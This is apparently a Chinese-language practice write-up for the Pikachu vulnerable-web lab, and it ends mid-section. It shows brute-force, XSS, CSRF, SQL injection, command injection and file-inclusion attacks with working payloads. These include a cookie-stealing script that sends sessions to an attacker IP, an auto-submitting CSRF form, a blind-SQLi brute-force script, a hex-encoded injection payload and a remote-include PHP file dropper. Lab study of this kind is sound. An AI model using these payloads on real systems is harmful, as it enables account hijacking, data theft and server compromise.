### 暴力破解

#### 基于表单的暴力破解

开启Burp抓包， Cluster bumb 对username,password字段的字典做全排列爆破，得到admin/123456

#### 验证码绕过（on server）

验证码不过期，用repeater模块测试验证码是否过期，发现验证码不过期可以重复提交username 和password，同上爆破

#### 验证码绕过（on client）

客户端自己验证自己，就是一切都用户说了算。f12开发者模式查看网页源码发现验证码的生成和验证码的校验都是通过前端实现的，只要正确填写过一次验证码，让burp抓到包就可以爆破了

#### token防爆破？

查看源码发现提交的表单里面有个hidden属性的token值，每次拉取表单的时候生成的token值会不一样,提交的表单必须含有该token值才有效，burp的intruder模块中递归grep （Recursive grep）正合适这种模式。此Payload类型主要使用于从服务器端提取有效数据的场景，需要先从服务器的响应中提取数据作为Payload，然后替换Payload的位置，进行攻击。它的数据来源了原始的响应消息，基于原始响应，在Payload的可选项设置（Options）中配置Grep规则，然后根据grep去提取数据才能发生攻击。
提取token值用于爆破的步骤为：

1. 在token防爆破页面提交一次表单
2. Burp抓包
3. 将报文发送到intrude模块
4. Attack type选择Pitchfork模式
5. position里面设置username,password,token的值为payload
6. payload子选项里面payload set 设置1为用户名字典，2为密码字典，3的payload type选择recursive grep
7. payload3的payload option 的initial payload for first payload填上第一次爆破的token值
8. 在option模块的子选项grep-extract中定位到第一次请求返回的form表单里面的toke的value值
9. recursive grep是不支持的多线程的，所以还要在request engine里面设置线程数为1  
10. 点start attack 按钮开始攻击
    

### Cross-Stie Scripting

#### 反射型xss(get)

输入框提示输入你最喜欢的篮球明星，点击submit之后这里直接将你输入的东西反馈输出到Web前端。测试的时候发现输入框其实对我们的输入长度是有限制的,限制了最大长度是20。输入  ' " <> 特殊字符都可以原封不动的输出，可以发现没有任何过滤

```html
<input class="xssr_in" maxlength="20" name="message" type="text">
```

比如我们的payload是`<script>alert(1)</script>`，长度就超过了限制，绕过方法就是修改前端input 的maxlength字段直接在输入框写payload提交。

#### 反射型xss(post)

这里需要登录，前面爆破的账号密码admin/123456登录即可，然后又是输入你最喜欢的篮球明星的输入框，t不同的是post方式提交参数，需要我们构造一个攻击的利用场景。

#### 存储型xss

存储型xss一般出现在留言、博客日志、评论等地方，危害比反射型xss要大 , 恶意的JS代码保存在服务器端，只要访问该页面的用户都会触发恶意代码，比较著名的SamyWorm就是存储型XSS。利用场景我们来模拟一下cookie窃取：

模拟攻击服务器我们使用nclisten监听，服务端输入nc -l 4444

此题是个留言板，没有过滤，可以通过提交一个`<script>`标签来触发恶意JS窃取cookie并发送到恶意server，如：

```js
<script>
document.write("<img src=http://192.168.168.101:4444/"+document.cookie+">");
</script>
```

此恶意代码的意思是将该页面的cookie当作url，发送到我们nc监听端口上。攻击者即可在被监听端口上看到完整报文，通过url参数间接窃取到用户cookie，如刷新本题页面，我们会收到：

```
GET /PHPSESSID=t30hinto5jli4asdjdi59n6k0a HTTP/1.1
Host: www.nclisten.cn:52119
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http:// daishen.ltd:113/vul/xss/xss_stored.php
Connection: close
content:('x.x.x.x', 4892)
123456789
```

cookie窃取案例大致如此，后面不做相关xss利用记录了,只记录触发和绕过。

#### Dom型xss

Dom型xss一般都是由前端JS对可控参数的处理不到位，造成的，如本题目的`click me!`按钮对应一个event事件，事件触发了domxss()这段JS脚本，继续跟踪分析找到domxss()代码如下：

```js
<script>
	function domxss(){
    var str = document.getElementById("text").value;
    document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
     	}
    //试试：'><img src="#" οnmοuseοver="alert('xss')">
    //试试：' οnclick="alert('xss')">,闭合掉就行
</script>
```

代码实现了从`text`框取值并插入到标签`<a href......>`中，我们可以先闭合a标签，重新构造新的恶意标签插入到这句代码里面的（代码里面也给了提示）。可以构建payload可以为：

```html
'><img src=x onerror=alert(1)><a href='#
```

这句payload经过处理之后，`document.getElementById("dom").innerHTML`写入的内容就为

```html
<a href=''><img src=x onerror=alert(1)><a href='#'>what do you see?</a>
```



#### Dom型xss-x

跟上题一样，还是先来看看代码逻辑， 它从url获取参数text的值然后组合出一个新的链接返回前端。

```js
function domxss(){
    var str = window.location.search; //取url后面的参数
    var txss = decodeURIComponent(str.split("text=")[1]); //url解码
    var xss = txss.replace(/\+/g,' ');
//  alert(xss);
    document.getElementById("dom").innerHTML = "<a href='"+xss+"'>就让往事都随风,都随风吧</a>";
    }
   //试试：'><img src="#" οnmοuseοver="alert('xss')">
   //试试：' οnclick="alert('xss')">,闭合掉就行
```

`请说出你的伤心往事`按钮取text组成个新链接，新链接的参数可控造成取值时的xss。 payload和上题一样，只是参数的传递过程不一样。

#### XSS盲打

就是攻击者在没有回显的情况下打xss payload， 可能的利用场景就是留言处，留言者看不到写入的内容，管理员可以从后台看到并触发恶意脚本，常被用来窃取cookie。

输入常规的payload:<script>alert(/xss/)</script>,点击提交后发现这里提示一段文字，应该是直接打到后台了，找到后台，登录进去看看,触发了XSS

#### XSS过滤

过滤了script，通过或者 

```html
<img src=x onerror=alert(1)>
<img src=xonerror="alert(/xss/)">
```

常见绕过方式：

1. 大小写

   ```javascript
   <SCRIPT>alert(/xss/)</sCRIpt>
   ```

#### XSS之htmlspecialchars

php的htmlspecialchars() 函数就是把预定义的字符转换为 HTML 实体。

预定义的字符是：

```
&：转换为&amp;

"：转换为&quot;

'：转换为成为 '

<：转换为&lt;

>：转换为&gt;
```

默认配置的htmlspecialchars不会转义`’`，测试思路是将这些符号输入一遍，看哪些符号会被转义。如我们输入`111<>'"`，查看返回结果里面源码这些字符已经被转换成预定义的实体编码了，除了单引号没被转换。

```html
<a href='111&lt;&gt;&quot;'&amp;'>
```

针对单引号来构造闭合为a标签添加新的属性绕过，如构造payload

```html
#' οnclick='alert(1)'
```

填充完原页面就完整代码如下，点击此标签就触发了xss

```html
<a href='#' οnclick='alert(1)''>#' οnclick='alert(1)'</a>
```

#### XSS之href

在a标签的href属性里面,可以使用javascript协议来执行js，可以尝试使用伪协议绕过

```html
javascript:alert(1);
```

防止href里面伪协议造成的xss可以通过限制开头必须是http或者https来实现

#### XSS之JS输出

这适用于可控变量输出在前端`<script>`的情况，测试思路是先随便输入一段字符提交，然后查看源码`Ctrl + F`查找刚才随便输入的字符串定位到代码。如我通过输入asdf并查找定位到了asdf对应的输出位置。

```js
<script>
    $ms='asdf';
    if($ms.length != 0){
        if($ms == 'tmac'){
            $('#fromjs').text('tmac确实厉害,看那小眼神..')
        }else {
        // alert($ms);
            $('#fromjs').text('无论如何不要放弃心中所爱..')
        }

    }
</script>
```

构造payload，如：

```js
tmac';alert(1);//
```

payload填入原输出位置就会变成

```js
 <script>
    $ms='tmac';alert(1);//';
	......
 </script>
```

相当与在原来的基础上插入了一段弹窗代码，xss利用成功。
XSS大致类型如上，防御可以归结为：输入时过滤，输出是转义，更多的还是要在实战中学习。

### CSRF

Pikachu靶场里对CSRF的解释是这样的:

> Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为"one click"攻击。很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆, 更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。

#### CSRF(get)

按照右上角的提示可以登录vince/allen/kobe/grady/kevin/lucy/lili等用户，登录上去后是个人信息修改页面，有个修改个人信息的链接，submit发送并抓包。

```http
GET http:// daishen.ltd:113/vul/csrf/csrfget/csrf_get_edit.php?sex=gir&phonenum=233&add=canada&email=lili%40picachu.com&submit=submit HTTP/1.1
Host: www.fxx.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.fxxx.com/vul/csrf/csrfget/csrf_get_edit.php
Connection: close
Cookie: PHPSESSID=38jfkmc1o29dm6gkkt8g33sim2
Upgrade-Insecure-Requests: 1
```

参数是get传参数，且没有csrf_token。攻击者A想要修改被攻击者B的相关信息，只需要构建这样一个链接让B去发送就可以了。相当于A借B的权限修改了B的个人信息。

如A想要把lili个人信息的email地址为自己的attacker@attacker.com, 可以构造链接：

```http
http:// daishen.ltd:113/vul/csrf/csrfget/csrf_get_edit.php?sex=gir&phonenum=233&add=canada&email=attacker%40attacker.com&submit=submit
```

A可以把这个链接通过邮件或者其他途径发给lili， 诱导lili点击。也可以结合前面的xss组合拳让lili的客户端自动发送该请求。比如在前面的存储xss区域留言如下，等待lili查看留言区的页面。

```html
'><img src='http:// daishen.ltd:113/vul/csrf/csrfget/csrf_get_edit.php?sex=gir&phonenum=233&add=canada&email=attacker%40attacker.com&submit=submit'>
1
```

模拟登录lili账户，查看存储xss留言区后再返回查看个人信息，可以发现个人邮箱已经被修改了

#### CSRF(POST)

利用方式就是前面写到的**反射型xss(post)**的利用场景，需要攻击者做一个自动提交form表单的恶意页面挂在服务器上并让受害者触发。和get类型csrf不同的是，攻击者需要针对含有csrf页面的表单构造恶意表单并自动提交。如攻击者针对此题构造页面如下：

```html
<html>
<head>
<title>Form表单自动提交</title>
<!-- 加载完页面自动点击submit提交 -->
<script type="text/javascript">
	window.onload = function(){
		//alert("windows_onload_exec");
		autoSubmit();
		window.location.href="http://www.fucguigui.com"; //提交完成跳转到的页面,为了伪装
	} 
</script>
<script type="text/javascript">
	function autoSubmit(){
		//alert('autosubmit_start');
 		document.getElementById("submit").click();
		//alert('after_submit');
		}
</script>
</head>
<body >
<!-- 隐藏的表单 -->
<form id='myForm' action="http:// daishen.ltd:113/vul/csrf/csrfpost/csrf_post_edit.php" method="post">
	<input type='hidden' name='sex' value='boy'>
	<input type='hidden' name='phonenum' value='evil'>
	<input type='hidden' name='add' value='fake_addr'>
	<input type='hidden' name='email' value='evil_form@admin.com'>
	<input id='submit' type="submit" name='submit' value="submit" style="display:none;"></input>
</form>
</body>
</html>
```

受害者lili登录了原来的漏洞页面，同时访问了攻击者构造的页面，就会在不知情的情况下被攻击者利用身份提交修改信息的表单。

### CSRF 防范

#### 增加token验证

1. 关键操作加token，token必须随机，每次都不一样

   > 关于csrf_token攻击的骚操作可以参考：[魔法才能打败魔法：关于获取csrf-token前端技巧思考](https://xz.aliyun.com/t/7084)

#### 关于安全的会话管理（避免会话被利用）

1. 客户端不保存敏感信息（如身份认证信息）
2. 测试关闭、退出的会话过期机制
3. 设置会话过期机制，如15分钟无操作，自动登录超时

#### 访问控制安全管理

1. 敏感信息的修改要求二次认证（如修改帐号时验证旧密码）
2. 信息修改用post，而不是get。
3. 通过http头部中的referer来限制原页面

#### 增加验证码

1. 验证码主要用来防爆破，但一些关键操作在不影响可用性的情况下最好也加上验证码。

### SQL注入

sqlmap或者扫描器扫描注入漏洞的情况就不说了，只记录手工测试的思路和简单的方法。手工注入比较重要的是需要对各种数据库的特性和语句比较了解，需要下很大的功夫去学习。

顺便提一下，有union回显的mysql可以注入sqligod，方便图形化注入，payload如下：

```
concat(0x3c7363726970743e6e616d653d70726f6d70742822506c6561736520456e74657220596f7572204e616d65203a2022293b2075726c3d70726f6d70742822506c6561736520456e746572205468652055726c20796f7527726520747279696e6720746f20496e6a65637420616e6420777269746520276d616b6d616e2720617420796f757220496e6a656374696f6e20506f696e742c204578616d706c65203a20687474703a2f2f736974652e636f6d2f66696c652e7068703f69643d2d3420554e494f4e2053454c45435420312c322c332c636f6e6361742830783664363136622c6d616b6d616e292c352d2d2b2d204e4f5445203a204a757374207265706c61636520796f757220496e6a656374696f6e20706f696e742077697468206b6579776f726420276d616b6d616e2722293b3c2f7363726970743e,0x3c623e3c666f6e7420636f6c6f723d7265643e53514c69474f44732053796e746178205620312e30204279204d616b4d616e3c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d343e496e6a6563746564206279203c7363726970743e646f63756d656e742e7772697465286e616d65293b3c2f7363726970743e3c2f666f6e743e3c62723e3c7461626c6520626f726465723d2231223e3c74723e3c74643e44422056657273696f6e203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,version(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e2044422055736572203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,user(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e5072696d617279204442203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,database(),0x203c2f74643e3c2f74723e3c2f7461626c653e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e43686f6f73652061207461626c652066726f6d207468652064726f70646f776e206d656e75203a203c2f666f6e743e3c62723e,concat(0x3c7363726970743e66756e6374696f6e20746f48657828737472297b76617220686578203d27273b666f722876617220693d303b693c7374722e6c656e6774683b692b2b297b686578202b3d2027272b7374722e63686172436f646541742869292e746f537472696e67283136293b7d72657475726e206865783b7d66756e6374696f6e2072656469726563742873697465297b6d616b73706c69743d736974652e73706c697428222e22293b64626e616d653d6d616b73706c69745b305d3b74626c6e616d653d6d616b73706c69745b315d3b6d616b7265703d22636f6e636174284946284074626c3a3d3078222b746f4865782874626c6e616d65292b222c3078302c307830292c4946284064623a3d3078222b746f4865782864626e616d65292b222c3078302c307830292c636f6e6361742830783363373336333732363937303734336537353732366333643232222b746f4865782875726c292b2232323362336332663733363337323639373037343365292c636f6e63617428636f6e6361742830783363373336333732363937303734336536343632336432322c4064622c307832323362373436323663336432322c4074626c2c3078323233623363326637333633373236393730373433652c30783363363233653363363636663665373432303633366636633666373233643732363536343365323035333531346336393437346634343733323035333739366537343631373832303536323033313265333032303432373932303464363136623464363136653363326636363666366537343365336336323732336533633632373233653534363136323663363532303465363136643635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4074626c2c3078336332663636366636653734336532303636373236663664323036343631373436313632363137333635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4064622c307833633266363636663665373433653363363237323365346537353664363236353732323034663636323034333666366337353664366537333230336132303363363636663665373432303633366636633666373233643632366337353635336533633733363337323639373037343365363336663663363336653734336432322c2853454c45435420636f756e7428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d40646220616e64207461626c655f6e616d653d4074626c292c3078323233623634366636333735366436353665373432653737373236393734363532383633366636633633366537343239336233633266373336333732363937303734336533633266363636663665373433652c307833633632373233652c2873656c65637420284078292066726f6d202873656c656374202840783a3d30783030292c284063686b3a3d31292c202873656c656374202830292066726f6d2028696e666f726d6174696f6e5f736368656d612e636f6c756d6e732920776865726520287461626c655f736368656d613d3078222b746f4865782864626e616d65292b222920616e6420287461626c655f6e616d653d3078222b746f4865782874626c6e616d65292b222920616e642028307830302920696e202840783a3d636f6e6361745f777328307832302c40782c4946284063686b3d312c30783363373336333732363937303734336532303633366636633665363136643635323033643230366536353737323034313732373236313739323832393362323037363631373232303639323033643230333133622c30783230292c30783230363336663663366536313664363535623639356432303364323032322c636f6c756d6e5f6e616d652c307832323362323036393262326233622c4946284063686b3a3d322c307832302c30783230292929292978292c30783636366637323238363933643331336236393363336436333666366336333665373433623639326232623239376236343666363337353664363536653734326537373732363937343635323832323363363636663665373432303633366636633666373233643637373236353635366533653232326236393262323232653230336332663636366636653734336532323262363336663663366536313664363535623639356432623232336336323732336532323239336237643363326637333633373236393730373433652c636f6e6361742830783363363233652c307833633733363337323639373037343365373137353635373237393364323232323362363636663732323836393364333133623639336336333666366336333665373433623639326232623239376237313735363537323739336437313735363537323739326236333666366336653631366436353562363935643262323232633330373833323330333336313333363133323330326332323362376437353732366333643735373236633265373236353730366336313633363532383232323732323263323232353332333732323239336236343664373037313735363537323739336437353732366332653732363537303663363136333635323832323664363136623664363136653232326332323238373336353663363536333734323834303239323036363732366636643238373336353663363536333734323834303361336433303738333033303239323032633238373336353663363536333734323032383430323932303636373236663664323832323262363436323262323232653232326237343632366332623232323937373638363537323635323834303239323036393665323032383430336133643633366636653633363137343566373737333238333037383332333032633430326332323262373137353635373237393262323233303738333336333336333233373332333336353239323932393239363132393232323933623634366636333735366436353665373432653737373236393734363532383232336336313230363837323635363633643237323232623634366437303731373536353732373932623232323733653433366336393633366232303438363537323635323037343666323034343735366437303230373436383639373332303737363836663663363532303534363136323663363533633631336532323239336233633266373336333732363937303734336529292929223b75726c3d75726c2e7265706c616365282227222c2225323722293b75726c706173313d75726c2e7265706c61636528226d616b6d616e222c6d616b726570293b77696e646f772e6f70656e2875726c70617331293b7d3c2f7363726970743e3c73656c656374206f6e6368616e67653d22726564697265637428746869732e76616c756529223e3c6f7074696f6e2076616c75653d226d6b6e6f6e65222073656c65637465643e43686f6f73652061205461626c653c2f6f7074696f6e3e,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.tables) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=concat(@x,0x3c6f7074696f6e2076616c75653d22,UNHEX(HEX(table_schema)),0x2e,UNHEX(HEX(table_name)),0x223e,UNHEX(HEX(concat(0x4461746162617365203a3a20,table_schema,0x203a3a205461626c65203a3a20,table_name))),0x3c2f6f7074696f6e3e))))x),0x3c2f73656c6563743e),0x3c62723e3c62723e3c62723e3c62723e3c62723e)

```

#### 数字型输入

这题输入是从一个select box选择一个数字，post提交后端数据库查询，输出是用户名和email。猜想后端执行了这样一句SQL:

```mysql
select username字段, email字段 from 用户表表 where userid=$_POST(userid);
```

最常见的也是最简单的构造注入是闭合sql语句最后一个字段并插入新的字符。随便提交一个数字如1，burp抓包放到repeater模板, post的参数改为`id=1'&submit=%E6%9F%A5%E8%AF%A2`，试着用`'`闭合语句，果然有回显报错。

```mysql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 
```

从报错信息可以确认注入漏洞存在且后端数据库为mysql，如果对mysql语句比较了解这里就可以自己构造的payload了，有回显报错的也可以根据报错逐渐调整语句。如我们想要确认数据库版本，手工注入的话，可以先来确定列数量。先试着order by 3 报错，说明查询出来的列数小于3

```
id=1 order by 3&submit=%E6%9F%A5%E8%AF%A2
```

order by 2的时候可以正常执行，说明查询结果返回的列数是2。知道列数之后对我们后面手工构造注入语句是非常关键的一步。构造payload确定输出回显位置。

```
id=1 union select 1,2&submit=%E6%9F%A5%E8%AF%A2
```

通过这步的回显`hello 1, your email is:2`我们知道了查询的回显位置，也可大概判断出这两个查询结果数据类型应该是字符，如果想要继续手工注入，比如通过前面的报错回显，我们已经确定后端数据是mysql了，那它版本是多少呢？可以构造payload如：

```
id=1 union select @@version,2&submit=%E6%9F%A5%E8%AF%A2
```

结果为

```
hello,5.7.27 your email is: 2
```

这样就得到了数据库版本为，mysql 5.7.27。SQLI的利用原理大体如此。

#### 字符型注入(GET)

这里的字符型输入有个输入框，GET方法传参name。先输入kobe试试，查询结果为`your uid:3 your email is: kobe@pikachu.com` 同样的思路在结尾加上’ sql报错。其实有报错回显是sql注入最简单的一种情况，用上面数字类型同样的payload发现已经用不了了。还是从原始sql语句考虑，一般字符类型的插入语句可能是：

```mysql
select uid字段, email字段 from 用户表表 where username='$_GET(username);'
```

因为写sql的时候字符类型可能就是用单引号或者双引号扩起来的。想要插入的语句可以闭合并正常执行，那就要考虑闭合前面字符串的引号，同时通过前面的注入我们知道数据库是mysql, 想让语句结尾的引号失效可以用单行注释#。

比如想要执行

```
select 1,'Inject by C'
```

payload就要写成

```mysql
' union select 1,'Inject by C'#
```

拼接到原来语句中就是一个完整的注入语句了。

```mysql
select uid字段, email字段 from 用户表表 where username='' union select 1,'Inject by C'#'
```

GET传参数注意要url编码，所以完整payload是

```http
http://xxxx/vul/sqli/sqli_str.php
?name='%20union%20select%201%2c'Inject by C'%23
&submit=%E6%9F%A5%E8%AF%A2
```

#### 搜索型注入

一般搜索功能都会用到SQL模糊匹配功能，如：搜索所有用户名含有k的用户

```
select * from USER where usename='%k%'
```

构造payload的思路和字符型一样，构造闭合就好了，可以构造payload

```mysql
k%' union select 1,2,'sqlitest'#
```

url编码并整合到get传参给服务器执行

```
http://xxxxxx/vul/sqli/sqli_search.php
?name=k%25'%20union%20select%201%2c2%2c'sqlitest'%23
&submit=%E6%90%9C%E7%B4%A2
```

#### XX类注入

其实通过前面的三种情况也可以看出来了，SQL注入就是猜测语句拼接应该是什么和确认构造的payload是否执行。通过查询参数结尾加上’的报错回显是一种确认sql注入的方式，当然也有不回显的其他注入。

一般判断语句有没有执行也可以通过`' and 1=2 #`、`' or 1=1 #`这样的逻辑表达式拼接在语句后面观察结果不同。和前面一样的方法测试闭合，测试到

```
kobe')#
```

发现语句可以正常执行，说明这里拼接的语句闭合还要加上括号。在注释前面加上想要执行的语句试试，成功注入

```
http://xxx/vul/sqli/sqli_x.php
?name=kobe')%20union%20select%201,'sqlitest'%23
&submit=%E6%9F%A5%E8%AF%A2
```

#### INSERT/UPDATE注入

前面都基于union或者select查询的注入，但其实插入和更新也是可以是注入的，不仅可能是sql注入，也可能存在存在存储型xss（比如这里注册的时候用户写![img](https://blog.csdn.net/cynthrial/article/details/x), 登录的时候你就可以发现弹窗了）。insert注入的时候如果通过子查询语句拼接并登录上去在找刚才插入的位置，每次测试都要注册一个帐号，那就比较麻烦了。基于updatexml()、extractvalue()、floor()等构造报错点输出我们想要的数据就比较方便了。对于insert语句一般比较常见类似这种

```mysql
insert into USERS（username, passwd,email） values('','','')
```

想要插入语句的时候可以通过or来构造闭合，比如username填入字段

`' or evil_sql or '`, 插入到原句中就可以实现执行恶意语句的效果

```mysql
insert into USERS（username, passwd,email） values('' or evil_sql or','','')
```

基于报错注入用户名处payload就为

```
kobe2' or updatexml(1,concat(0x7e,version()),0) or '
```

然后密码字段随便输入一个提交就能发现我们查询版本的的报错回显：

```
XPATH syntax error: '~5.7.27'
```

UPDATE的注入同理，也是可以用同样的payload，需要注意的是，填写update表单的时候记得每一栏都要填上再点submit，不然是不执行的，这个是靶场后端代码的问题。

#### Delete注入

不难发现这里点击删除的按钮会get方式发送id参数，同时id参数为一个数字类型，所以同样可以报错函数来触发回显。构造payload

```
 or extractvalue(1,concat(0x7e,database()))#
```

url编码后拼接在url参数后面

```
http://xxxxxx/vul/sqli/sqli_del.php?id=61%20or%20extractvalue(1%2cconcat(0x7e%2cdatabase()))#
```

访问后，database()函数成功执行并在报错中回显，注入成功。

```
XPATH syntax error: '~pikachu'
```

报错注入 floor注入（可参考https://www.cnblogs.com/sfriend/p/11365999.html）

floor()报错注入是利用floor,count,group by冲突报错，是当这三个函数在特定情况一起使用产生的错误。了解原理之后你会发现这是一个非常巧妙的方法。

#### "http header"注入

admin/123456登录之后页面显示了user agent 、http accept和端口号信息并提示这个信息已经记录到数据库，不难猜测这里用到了数据库的insert语句，insert的内容是从http header里面取的值，burp抓包改User-Agent试试，果然是取http-header的字段。利用payload同理可用基于报错的注入。发送页面请求抓包修改http header里面的UA部分为

```
User-Agent: evil' or updatexml(1,concat(0x7e,version()),0) or '
```

基于报错注入的回显

```
XPATH syntax error: '~5.7.27'
```

同理，http_accept等也可以使用相同的方法注入。还有就是这里的cookie里面有username和passwd字段，也不难发现这里是存在

#### 盲注（base on boolean）

盲注就是在某些情况下，数据库的报错回显被开发人员屏蔽掉了，我们无法通过回显来确定注入点和注入结果。

判断注入点还是可以通过`and 1=1#`、`ordey by 1#`这种类似逻辑运算观察页面是否正常来确定。盲注的利用可以基于bool的判断、基于时间注入或者dnslog。

这里首先来看bool注入。输入`kobe' and 1=1#`执行了，`kobe' and 1=2#`没有执行，所有我们的内容肯定已经注入成功了。怎么利用呢？

bool注入比较重要的是lenth()、substr()函数和ascii（）函数这类取值和运算函数，substr()函数截取字符串的字母，通过ascii()函数转码成数字后就可以参与数学运算了。如：

```mysql
select ascii(substr('string',1,1))>114;
```

这条语句会返回1, 应为string截取后算字符s的ascii码为115，而115显然大于114。当然这样一个一个判断很慢，比如注入数据库名，我们也不知道这个字符有多长，这个时候可以基于length函数来判断长度。如

```
kobe' and length(database())>7#
```

显示username不存在，但

```
kobe' and length(database())>6#
```

显示的就是查询到结果的信息。所有我们确定了数据库名有7个字符。

接着判断数据库的第一个字符是什么呢？可以通过类似

```
kobe' and ascii(substr(database(),1,1))=112# #数据库名pikachu，p的ascii值为112，表达式为真，把112换成其他值为假
```

这样的逻辑判断我们就可以确定每个字符的ascii码值了。bool盲注的原理大致如此，手工这样测试难免工作量太大，所以bool类型的盲注最好是靠自动化脚本完成。

针对这里这里的数据库名爆破，写个简单的爆破脚本可以如下

```python
# 仅仅做爆破脚本示意，使用二分法爆破效率会更高一些

import requests
import string

base_url='http://xxxx.com:88/vul/sqli/sqli_blind_b.php'

# data = {"name": "kobe' and ascii(substr(database(),1,1))=112#", "submit": "提交"}
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
                         " Chrome/54.0.2840.99 Safari/537.36"}
cookies = {"PHPSESSID": "iiuifpfpk5b4u462apjm5nqb87"}

# r = requests.get(base_url,  params=data, headers=headers, cookies=cookies)

for length in range(1, 8):
    for i in range(0, 128):
        data = {"name": "kobe' and ascii(substr(database()," + str(length)+ ",1))="+str(i)+"#", "submit": "提交"}
        r = requests.get(base_url, params=data, headers=headers, cookies=cookies)
        if r.text.find('your uid') != -1:
            print(chr(i))
            break
```

当然像上面的substr（）函数可替代的还有left(), right()等各种取字符的函数。

常用取表名可以通过information_schema，但有时候这个表是不可读的，基于真假还可以通过exists函数来爆破表名

```
kobe' and exists(select * from [表名字典])#
```

结合burp grep规则来猜解表名。

#### 盲注（base on time）

如果说基于bool的注入可以基于0或者1来判断注入，那基于时间的盲注就是啥也看不到，你无法从显示的不同来判断你的语句是否执行。这时可以引入基于时间的盲注。mysql的延时函数是sleep，比如这里的输入框我输入`kobe`回显还是比较快的，但如果这里输入

```
kobe' and sleep(5)#
```

发现server端处理这个请求用了很长时间，那就是存在sql注入了。payload利用的话可以结合if判断语句，如：判断database()返回的第一位是否是p，可构造payload

```
kobe' and if((substr(database(),1,1))='p', sleep(5),null)#
```

对比下

```
kobe' and if((substr(database(),1,1)='a', sleep(5),null))#
```

的返回时间，不难发现第一个payload肯定执行了sleep函数，所以取得数据库名第一个字母为p， 后面的利用方法就依次类推次数了。另外的`BENCHMARK( count, expr)`函数也可以实现基于时间盲注的效果，`count`是计算expr表达式的次数，值越大，时间自然越长。

#### 宽字节注入

宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围)，但现在其实用法比较广泛的是unicode或者ut8。phithon大神篇博客讲到了宽字节注入写的很详细明了：https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html

原理搞懂了，构造post数据包的注入

```http
name=kobe%df' or 1=1#&submit=%E6%9F%A5%E8%AF%A2
```

### RCE

远程命令执行一般是攻击者直接向后台服务器发送远程注入系统的指令或代码，从而控制后台系统。

#### exec"ping"

这里就是ping的一个功能接口，输入127.0.0.1可以返回执行ping的结果，但是由于后端是直接拼接指令的，伪代码为

```php
ping $_POST[ip]
```

如果post参数为

```
127.0.0.1;ls
127.0.0.1 | whoami
```

拼接完的完整命令就为

```bash
ping 127.0.0.1;ls
```

这就实现了注入命令的效果。

#### exec"eval"

> 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。不管是使用了代码执行的函数,还是 【；使用了不安全的反序列化等等。
>
> 因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。

这里主要是后端的eval()调用了未经过滤的用户输入数据，从而实现了执行php代码。

如这里输入POC

```
phpinfo();
```

系统执行了该php代码并返回了执行结果

### File Inclusion

文件包含漏洞一般是代码调用了用户可控的任意文件，可能造成命令执行或者任意文件读取。include(),require()等就是常见的php包含函数。

#### 本地文件包含

这里是一个选择框，选择对应人名会显示对应人物信息，但注意看url

```http
http://xxx/vul/fileinclude/fi_local.php?filename=file1.php&submit=Submit+Query
```

filename参数包含的是个包含的文件，如果把filename字段换成其他已知系统路径如linux的`/etc/passwd`，通过`../`表示上层目录，多写几个使得到根目录位置

```http
http://xxx/vul/fileinclude/fi_local.php?filename=../../../../../../../etc/passwd&submit=Submit+Query
```

访问这个链接系统就读取了passwd文件并回显了

#### 远程文件包含

远程文件包含原理同上，不同的是包含的文件是外部地址代码，php环境的利用条件是php.ini中设置allow_url_open(默认打开)，allow_url_include(默认关闭)均是开启状态。

正常的请求是

```
http://xxx/vul/fileinclude/fi_remote.php?filename=include%2Ffile1.php&submit=Submit+Query
```

如果filename参数改成远程包含的恶意文件，那系统就可能执行远程加载的恶意脚本。

例如想要利用该漏洞在目标站点写入一个phpinfo页面，首先可以构造一段写入文件的代码

phpinfo.txt

```php
<?php
 system("echo '<?php phpinfo();?>'>>phpinfo.php");
?>
```

把这个文件放在可访问的地址上如：http;//a.com/phpinfo.txt。然后构造远程文件包含的poc并访问。

```
http://xxx/vul/fileinclude/fi_remote.php?filename=http://a.com/phpinfo.php&submit=Submit+Query
```

后台会执行并远程加载的内容创建一个phpinfo.php，访问漏洞站点对应路径上的phpinfo.php可以看到我们文件写入成功同时也被漏洞站点执行了。漏洞利用成功。

### Unsafe Filedownload

任意文件下载是由于下载的文件名称可以绕过预期下载文件名限制，同时后端对用户提交的下载文件名参数请求不加判断直接拼接进路径执行下载操作造成的。漏洞危害可能会造成网站源码下载，敏感信息泄漏等。

正常请求为，发送请求后会下载kb.png

```
